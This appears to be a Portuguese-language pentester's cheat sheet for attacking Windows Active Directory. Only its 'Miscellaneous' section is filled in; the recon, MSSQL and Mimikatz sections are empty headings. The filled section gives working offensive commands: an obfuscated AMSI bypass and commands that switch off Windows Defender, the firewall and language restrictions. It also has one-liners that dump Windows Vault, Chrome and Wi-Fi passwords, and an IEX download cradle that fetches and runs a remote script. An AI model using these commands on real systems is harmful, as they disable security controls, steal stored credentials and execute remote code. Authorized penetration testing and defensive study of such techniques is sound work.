# Active Directory

Tudo relacionado à Active Directory centralizarei neste post para facilitar a procura e exploração, não vou explicar os comandos de maneira completa, tendo em vista isso ser apenas um memorando dos principais comandos que utilizo durante meus pentests!

Nota-se que todos os comandos aqui são dados a partir de máquinas windows para windows (isso mesmo), ou seja, não acrescentei aqui (ainda) os comandos do [Impacket](https://github.com/SecureAuthCorp/impacket)

`Faça bom proveito!`

## Sumário

- [Active Directory](#active-directory)
    - [Sumário](#sumário)
    - [Ferramentas Úteis](#ferramentas-úteis)
        - [Mimikatz.ps1](#mimikatz.ps1)
        - [Kekeo](#kekeo)
        - [HFS](#HFS)
        - [PowerCat](#powercat)
        - [Nishang](#nishang)
        - [PowerView](#powerview.ps1)
        - [PowerView_dev](#powerview_dev.ps1)
        - [AD Module](#ad-module.ps1)
        - [Jenkins](#jenkins)
        - [BloodHound](#bloodhound.ps1)
        - [HeidiSQL](#heidisql-download)
        - [PowerUpSQL](#powerupsql.ps1)
    - [Miscellaneous](#miscellaneous)
        - [Defense Bypass](#defense-bypass)
            - [AMSI Bypass](#amsi-bypass)
            - [Windows Defender](#windows-defender)
            - [Costrained Language Mode](#constrained-language-mode)
            - [Firewall](#firewall)
            - [Applocker](#applocker)
        - [PSSEssion](#pssesion)
            - [Nova Seção](#nova-seção)
            - [Carregando Scripts](#carregando-scripts)
            - [Executando Comandos](#executando-comandos)
            - [Copiando Arquivos Entre Seções](#copiando-arquivos-entre-seções)
        - [Senhas Vault e Registro](#registro)
            - [Senhas do Windows Vault](#senhas-do-windows-vault)
            - [Senhas do Google Chrome](#senhas-do-google-chrome)
            - [Senhas Wifi](#senhas-wifi)
            - [Patterns no Registro](#patterns-no-registro)
            - [Chaves no Registro](#chaves-no-registro)
            - [Valores no Registro](#valores-no-registro)
        - [Download de Arquivos](#download-de-arquivos)
        - [Extraindo Arquivos Zip](#extraindo-arquivos-zip)
        - [Unattended Files](#unattended-files)
        - [PortScan Powershell](#portscan-powershell)
    - [Reconhecimento](#reconhecimento)
        - [PowerView](#powerview)
            - [Usuários](#usuários)
            - [Grupos](#grupos)
            - [Computadores](#comptuadores)
            - [Domain Administrators](#domain-administrators)
            - [Shares](#shares)
            - [ACL](#acl)
            - [OUs](#ous)
            - [GPO](#gpo)
            - [Trusts](#trusts)
            - [User Hunting](#user-hunting)
            - [SID](#sid)
        - [PowerView_dev.ps1](#powerview_dev)
        - [AD Module.ps1](#ad_module.ps1)
        - [BloodHound](#bloodhound)
    - [MSSQL](#mssql)
        - [PoweUpSQL](#powerupsql)
        - [HeidiSQL](#heidisql)
    - [Mimikatz](#mimikatz)
        - [Recon](#recon)
            - [Dumps](#dumps)
            - [Hashes](#hashes)
        - [Ataques](#ataques)
            - [Pass-The-Hash](#pass-the-hash)
            - [Pass-The-Ticket](#pass-the-ticket)
            - [Privilege Across Trusts](#privilege-across-trusts)
            - [DCSync](#dcsync)
            - [Skeleton Key](#skeleton-key)
            - [Kerberoast](#kerberoast)
        - [Tickets](#tickets)
            - [Golden Ticket](#golden-ticket)
            - [Silver Ticket](#silver-ticket)
                - [RPCSS](#rpcss)
                - [HOST](#host)

# Active Directory

Então, mãos à obra!

## Sumário

Vamos seguir o seguinte sumário já mostrado ali em cima...

### Ferramentas Úteis

Vamos começar pelas ferramentas que utilizei durante a exploração!

### Mimikatz.ps1

[Mimikatz](https://github.com/gentilkiwi/mimikatz)

### Kekeo

[Kekeo](https://github.com/gentilkiwi/kekeo)

### HFS

[HFS](https://www.rejetto.com/hfs/)

### PowerCat

[PowerCat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1)

### Nishang

[Nishag](https://github.com/samratashok/nishang)

### PowerView.ps1

[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

### PowerView_dev.ps1

[PowerView_dev](https://github.com/lucky-luk3/ActiveDirectory/blob/master/PowerView-Dev.ps1)

### AD Module.ps1

[ADModule](https://github.com/samratashok/ADModule)

### Jenkins

[Jenkins Brute](https://github.com/chryzsh/JenkinsPasswordSpray)

### BloodHound.ps1

[BloodHound](https://github.com/puckiestyle/powershell/blob/master/SharpHound.ps1)

### HeidiSQL Download

[HeidiSQL](https://www.heidisql.com/download.php)

### PowerUpSQL.ps1

[PowerUPSQL](https://github.com/NetSPI/PowerUpSQL)

## Miscellaneous

Nesta seção está tudo que é tipo de código!

### Defense Bypass

Bypasses simples mas eficazes de defesas

#### AMSI Bypass

```powershell
# Execute no terminal que estiver sendo pego pelo AMSI
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

Esse primeiro é o principal, esses outros são em caso o primeiro não dê certo!

```powershell
# Chame um powershell a partir desse local
C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe
# Execution Policy (não é bem AMSI)
powershell -ep bypass
# Downgrade de versão
powershell -version 2
# Upgrande de versão
pwsh
```

#### Windows Defender

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

Esse primeiro é o principal, esses outros são em caso o primeiro não dê certo!

```powershell
Set-MpPreference -DisableIOAVProtection $true
sc stop WinDefend
```

#### Costrained Language Mode

`Colocar o Invoke-Mimikatz no final do código, não somente o Invoke-Mimikatz mas qualquer outro comando ou script, que ele vai executar assim que carregar`

Esse primeiro é o principal, esses outros são em caso o primeiro não dê certo!

```powershell
$ExecutionContext.SessionState.LanguageMode
$ExecutionContext.SessionState.LanguageMode = "FullLanguage"
```

#### Firewall

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

#### Applocker

```powershell
# Verifique o arquvios Applocker.Script dentro dessa pasta, o diretório que estiver nele estará liberado
C:\Windows\system32\AppLocker
```
Esse primeiro é o principal, esses outros são em caso o primeiro não dê certo!

```powershell
Get-AppLockerPolicy -Xml -Local
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleColletions
```

## PSSEssion

SSH no Windows?!

### Nova Seção

```powershell
$sess = New-PSSession -ComputerName abc.dominio.local
```

### Carregando Scripts

```powershell
# Desativar o Windows Defender
Invoke-Command -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true} -Session $sess
# Carregar o Script
Invoke-Command -FilePath "C:\Invoke-Mimikatz.ps1" -session $sess
```

### Executando Comandos

```powershell
Invoke-Command -ScriptBlock {Get-Process Notepad} -Session $sess
```

### Copiando Arquivos Entre Seções

```powershell
Copy-Item -Path C:\Reports\flag.txt -Destination 'C:\Users\Desktop\' -FromSession $sess
```

### Senhas Vault e Registro

Não é bem AD mas ajuda um bocado durante a exploração

#### Senhas do Windows Vault

Importante lugar pra verificar credenciais salvas, já encontrei muita coisa interessante aqui!

```powershell
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }
```

#### Senhas do Google Chrome

Essa não preciso nem falar nada

```powershell
[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($datarow.password_value,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))
```

#### Senhas Wifi

```powershell
(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
```

#### Patterns no Registro

```powershell
$pattern = "password"
$hives = "HKEY_CLASSES_ROOT","HKEY_CURRENT_USER","HKEY_LOCAL_MACHINE","HKEY_USERS","HKEY_CURRENT_CONFIG"
```

#### Chaves no Registro

```powershell
foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | sls "$pattern" }
```

#### Valores no Registro

```powershell
foreach ($r in $hives) { gci "registry::${r}\" -rec -ea SilentlyContinue | % { if((gp $_.PsPath -ea SilentlyContinue) -match "$pattern") { $_.PsPath; $_ | out-string -stream | sls "$pattern" }}}
```

### Download de Arquivos

Escolha um e seja feliz!

```powershell
Invoke-WebRequest -Uri $url -OutFile $output
(New-Object System.Net.WebClient).DownloadFile($url, $output)
Start-BitsTransfer -Source $url -Destination $output
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
IEX(New-Object Net.WebClient).DownloadFile('http://0.0.0.0/arquivo','output')
powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.5/power.ps1')
```

### Extraindo Arquivos Zip

```powershell
Expand-Archive -Path $Source -DestinationPath $Destination
```

### Unattended Files

```powershell
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

### PortScan Powershell

```powershell
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("192.168.0.1",$_)) "Port $_ is open!"} 2>$null
```

## Reconhecimento

Aqui vamos iniciar o reconhecimento do Active Directory que vamos explorar!

### PowerView

#### Usuários

#### Grupos

#### Computadores

#### Domain Administrators

#### Shares

#### ACL

#### OUs

#### GPO

#### Trusts

#### User Hunting

#### SID

### PowerView_dev

### AD Module

### BloodHound

## MSSQL

### PoweUpSQL

### HeidiSQL

## Mimikatz

### Recon

#### Dumps

#### Hashes

### Ataques

#### Pass-The-Hash

#### Pass-The-Ticket

#### Privilege Across Trusts

#### DCSync

#### Skeleton Key

#### Kerberoast

### Tickets

#### Golden Ticket

#### Silver Ticket

##### RPCSS

##### HOST

